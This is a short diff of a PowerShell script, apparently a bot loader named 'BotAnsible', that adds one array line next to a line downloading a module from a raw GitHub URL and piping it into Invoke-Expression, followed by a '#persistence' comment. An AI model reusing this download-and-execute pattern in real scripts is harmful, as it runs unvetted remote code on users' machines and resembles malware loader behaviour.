@@ -15,6 +15,7 @@ $condition = $true
 $path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
 $ruta = $path;$ruta+="account_ansible";$ruta+=".psm1"
 (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex
+$commandlist=@('account_ansible')
 #if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
 #persistence
 
